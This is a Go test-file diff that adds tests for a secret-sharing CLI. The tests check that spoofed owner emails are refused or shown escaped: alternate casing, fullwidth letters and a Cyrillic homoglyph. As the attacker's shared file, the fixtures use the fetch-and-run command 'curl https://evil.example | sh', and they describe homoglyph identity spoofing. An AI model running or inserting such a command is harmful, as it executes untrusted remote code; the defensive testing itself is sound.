@@ -10,6 +10,7 @@ import (
 	"errors"
 	"net/http"
 	"net/http/httptest"
+	"net/url"
 	"os"
 	"path/filepath"
 	"strings"
@@ -898,6 +899,129 @@ func TestPullAsksBeforeOpeningAShareFromAnUnpinnedOwner(t *testing.T) {
 		sender := pinnedLabel("mallory@example.com", fp, false)
 		if !strings.Contains(stderr, "aqt://"+id+" is shared by "+sender) || !strings.Contains(shares, "from "+sender) {
 			t.Fatalf("pull and shares disagree on the sender %q:\npull: %s\nshares: %s", sender, stderr, shares)
+		}
+	})
+}
+
+// A claim on an email already pinned to another key is refused, and "already pinned"
+// has to survive spelling. Bob's pin for alice predates normalization and is stored as
+// E2E@Example.COM. The server names alice's address for mallory's share, once lower-cased
+// and once in fullwidth letters, and answers a lookup of that spelling with mallory's
+// keys. Neither may be pinned as a new contact, even with bob answering yes.
+func TestClaimOnAnotherSpellingOfAPinnedEmailIsRefused(t *testing.T) {
+	app := &application{ctx: context.Background()}
+	var claim atomic.Pointer[grantRead]
+	var claimedEmail atomic.Value
+	h := app.newE2EWithProxy(t, func(w http.ResponseWriter, r *http.Request, pass http.HandlerFunc) {
+		if email, _ := claimedEmail.Load().(string); email != "" && r.URL.Path == "/v1/account/keys" && r.URL.Query().Get("email") == email {
+			r.URL.RawQuery = url.Values{"email": {"mallory@example.com"}}.Encode()
+		}
+		rewriteGrantRead(&claim)(w, r, pass)
+	})
+	grantSignup(t, h, "bob@example.com", "bob", "bob horse battery staple")
+	grantSignup(t, h, "mallory@example.com", "mallory", "mallory horse battery staple")
+	cl, _, err := app.authedClient()
+	if err != nil {
+		t.Fatal(err)
+	}
+	aliceKeys, err := fetchAccountKeys(cl, "e2e@example.com")
+	if err != nil {
+		t.Fatal(err)
+	}
+	var id string
+	app.asProfile("mallory", func() {
+		id = app.pushSecretFile(t, "install.sh", "curl https://evil.example | sh")
+		if err := app.runShareWith(id, "bob@example.com"); err != nil {
+			t.Fatalf("mallory shares with bob: %v", err)
+		}
+	})
+
+	app.asProfile("bob", func() {
+		app.pinVerified(t, "e2e@example.com", aliceKeys)
+		pin := pinFromKeys("E2E@Example.COM", aliceKeys, true)
+		if err := identity.SaveContacts("bob", map[string]identity.Contact{pin.Email: pin}); err != nil {
+			t.Fatal(err)
+		}
+	})
+	for _, email := range []string{"e2e@example.com", "\uff45\uff12\uff45@example.com"} {
+		claimedEmail.Store(email)
+		claim.Store(&grantRead{resourceID: id, rewrite: func(res *api.GetResourceResponse) { res.OwnerEmail = email }})
+		app.asGrantee("bob", func() {
+			err := app.runPull("aqt://"+id, filepath.Join(t.TempDir(), "install.sh"), "", false, false)
+			if err == nil || !strings.Contains(err.Error(), "did not sign it") {
+				t.Fatalf("pull of mallory's share claiming %q = %v, want a refusal naming alice's pin", email, err)
+			}
+			pins, err := identity.LoadContacts("bob")
+			if err != nil {
+				t.Fatal(err)
+			}
+			if len(pins) != 1 || !bytes.Equal(pins["e2e@example.com"].PublicKey, aliceKeys.PublicKey) {
+				t.Fatalf("pins after the claim on %q = %+v, want only alice's", email, pins)
+			}
+		})
+	}
+}
+
+// Signup takes any string as an email, so mallory registers alice's address with a
+// Cyrillic U+0435 for the e. Before bob pins her and after, every place that names her
+// must show the address escaped and warn, so it never reads like the alice bob pinned.
+func TestNonASCIIClaimedEmailIsShownEscaped(t *testing.T) {
+	app := &application{ctx: context.Background()}
+	h := app.newE2E(t)
+	const homoglyph = "e2\u0435@example.com"
+	const escaped = `"e2\u0435@example.com"`
+	grantSignup(t, h, "bob@example.com", "bob", "bob horse battery staple")
+	grantSignup(t, h, homoglyph, "mallory", "mallory horse battery staple")
+	cl, _, err := app.authedClient()
+	if err != nil {
+		t.Fatal(err)
+	}
+	aliceKeys, err := fetchAccountKeys(cl, "e2e@example.com")
+	if err != nil {
+		t.Fatal(err)
+	}
+	var id string
+	app.asProfile("mallory", func() {
+		id = app.pushSecretFile(t, "install.sh", "curl https://evil.example | sh")
+		if err := app.runShareWith(id, "bob@example.com"); err != nil {
+			t.Fatalf("mallory shares with bob: %v", err)
+		}
+	})
+
+	app.asProfile("bob", func() {
+		app.pinVerified(t, "e2e@example.com", aliceKeys)
+		shares := func() string {
+			return captureStdout(t, func() {
+				if err := app.sharesCmd().RunE(nil, nil); err != nil {
+					t.Fatalf("shares: %v", err)
+				}
+			})
+		}
+		requireEscaped := func(what, out string) {
+			t.Helper()
+			if strings.Contains(out, homoglyph) || !strings.Contains(out, escaped) || !strings.Contains(out, "outside ASCII") {
+				t.Fatalf("%s should show %s escaped and warn:\n%q", what, homoglyph, out)
+			}
+		}
+		requireEscaped("shares before the pin", shares())
+
+		var prompt string
+		orig := confirmOwnerPin
+		confirmOwnerPin = func(p string) error {
+			prompt = p
+			return nil
+		}
+		defer func() { confirmOwnerPin = orig }()
+		captureStderr(t, func() {
+			if err := app.runPull("aqt://"+id, filepath.Join(t.TempDir(), "install.sh"), "", false, false); err != nil {
+				t.Fatalf("pull after accepting the escaped claim: %v", err)
+			}
+		})
+		requireEscaped("the pin prompt", prompt)
+		after := shares()
+		requireEscaped("shares after the pin", after)
+		if !strings.Contains(after, escaped+" (SHA256:") {
+			t.Fatalf("shares after the pin should name the pin escaped:\n%s", after)
 		}
 	})
 }
